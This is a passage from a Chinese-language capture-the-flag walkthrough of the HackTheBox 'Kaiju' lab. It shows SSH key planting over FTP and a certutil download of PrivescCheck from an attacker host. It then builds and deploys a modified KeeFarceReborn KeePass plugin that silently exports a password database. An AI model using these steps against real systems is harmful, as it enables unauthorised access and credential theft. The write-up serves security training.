>

```c
cp ./id_sasrv.pub authorized_keys
```

### 上传密钥
```c
ftp> cd /Users/sasrv200/.ssh
ftp> put authorized_keys 
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||65489|)
150 Starting data transfer.
100% |***********************************************************|    91        1.70 MiB/s    00:00 ETA
226 Operation successful
91 bytes sent in 00:00 (0.14 KiB/s)
```

### 验证登录
> 上传公钥，私钥登录
>

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# ssh -i id_sasrv sasrv200@BERSRV200.kaiju.vl

Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

kaiju\sasrv200@BERSRV200 C:\Users\sasrv200>
```

## kaiju\sasrv200
### Getflag
```c
kaiju\sasrv200@BERSRV200 C:\Users\sasrv200\Desktop>type flag.txt
KAIJU{55f193142b7a67ced56f770035d135e1}
```

### PrivescCheck
#### 下载
```c
kaiju\sasrv200@BERSRV200 C:\Users\sasrv200\Desktop>certutil.exe -urlcache -split -f http://10.10.16.32/PrivescCheck.ps1
****  Online  ****
  000000  ...
  037762
CertUtil: -URLCache command completed successfully.
```

#### 运行
```c
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck -Format TXT,HTML"
```

#### 发现
> 我所拥有的账户对 Keepass 文件夹中所有文件都有写入权限
>

![](/image/hackthebox-prolabs/Kaiju-12.png)

## Keepass
> 我们之前通过ftp:ftp递归下载拿到了一部分敏感文件
>
> Software/KeePass2/Database 文件夹其中包含了keepass的数据库文件it.kdbx
>

![](/image/hackthebox-prolabs/Kaiju-13.png)

### 利用链接
> [https://github.com/denandz/KeeFarce/tree/master](https://github.com/denandz/KeeFarce/tree/master)
>
> [https://github.com/d3lb3/KeeFarceReborn](https://github.com/d3lb3/KeeFarceReborn)
>
> [https://blog.quarkslab.com/post-exploitation-abusing-the-keepass-plugin-cache.html](https://blog.quarkslab.com/post-exploitation-abusing-the-keepass-plugin-cache.html)
>
> [https://blog.spookysec.net/Backdooring-KeePass/](https://blog.spookysec.net/Backdooring-KeePass/)
>
> [https://github.com/plackyhacker/Malicious-KeePass-Plugin](https://github.com/plackyhacker/Malicious-KeePass-Plugin)
>
> [https://github.com/pfn/keepasshttp](https://github.com/pfn/keepasshttp)
>

### 从 FTP 下载 KeePass.exe
```bash
ftp backup@BERSRV200.kaiju.vl
ftp> cd "E:/Public/Software/KeePass2"
ftp> get KeePass.exe
ftp> exit
```

---

### 克隆并修改 KeeFarceReborn
```bash
git clone https://github.com/d3lb3/KeeFarceReborn
cd KeeFarceReborn/KeeFarceRebornPlugin
```

**修改项目引用**（在 `.csproj` 文件中）：

```xml
<Reference Include="KeePass">
  <HintPath>path\to\KeePass.exe</HintPath>
</Reference>
```

---

### 修改插件代码
**需要修改两处：**

1. **禁用弹窗** - 注释或删除所有 `MessageBox.Show(...)`
2. **修改导出路径**（改为可写位置）：

```csharp
string exportFilePath = @"C:\Windows\Temp\export.xml";
// 或
string exportFilePath = @"E:\Public\export.xml";
```

---

### 编译插件
在 **Windows VM** 上使用 Visual Studio：

```plain
编译 → 生成 KeeFarceRebornPlugin.dll
```

---

### 创建 KeePass 配置文件
**创建 **`**KeePass.config.xml**`：

```xml
<?xml version="1.0" encoding="utf-8"?>
<Configuration xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Meta>
    <PreferUserConfiguration>true</PreferUserConfiguration>
  </Meta>
  <Policy>
    <Plugins>true</Plugins>
    <Export>true</Export>
  </Policy>
</Configuration>
```

⚠️ **关键步骤**：此配置文件必须正确部署

---

### 上传到目标机器
```bash
# 上传 DLL 到 Plugins 目录
scp KeeFarceRebornPlugin.dll sasrv200@BERSRV200.kaiju.vl:'E:\Public\Software\KeePass2\Plugins\'

# 上传配置文件
scp KeePass.config.xml sasrv200@BERSRV200.kaiju.vl:'E:\Public\Software\KeePass2\'
```

---

### 监控 KeePass 进程
**在 SSH 会话中运行**：

```powershell
while ($true) {
    $p = Get-Process | Where-Object { $_.ProcessName -like '*keepass*' }
    if ($p) { Write-Host "KeePass running!"; $p | Format-Table }
    Start-Sleep -Seconds 2
}
```

---

### 等待并获取导出文件
```powershell
# 等待 export.xml 出现
while (-not (Test-Path "C:\Windows\Temp\export.xml")) {
    Start-Sleep -Seconds 5
}

# 查看导出内容
type C:\Windows\Temp\export.xml
```



